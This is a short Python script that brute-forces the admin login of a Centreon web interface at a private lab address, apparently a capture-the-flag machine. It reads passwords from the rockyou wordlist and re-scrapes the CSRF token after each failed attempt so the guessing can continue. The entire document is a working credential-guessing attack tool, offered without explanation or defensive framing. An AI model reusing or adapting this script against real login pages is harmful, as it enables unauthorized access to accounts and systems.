#!/usr/bin/python

import requests
from bs4 import BeautifulSoup

url = "http://10.10.10.157/centreon"
filename = open("rockyou.txt", "r")

request = requests.session()
print("[+] Retrieving CSRF token to sumbit the login form")
content = request.get(url)
soup = BeautifulSoup(content.text, 'html.parser')
token = soup.findAll('input')[3].get("value")

for password in filename:
    payload = {"useralias": "admin", "password": password, "submitLogin": "Connect", "centreon_token": token}
    r = request.post(url+"/index.php", payload)
    print token + ":" + password
    
    if "Your credentials are incorrect." in r.text:
        soup = BeautifulSoup(r.text, 'html.parser')
        token = soup.findAll('input')[3].get("value")
    else:
        print 'Password is: ' + password
        break

if "Your credentials are incorrect." in r.text:    
    print 'Brute force failes. No matches found.'
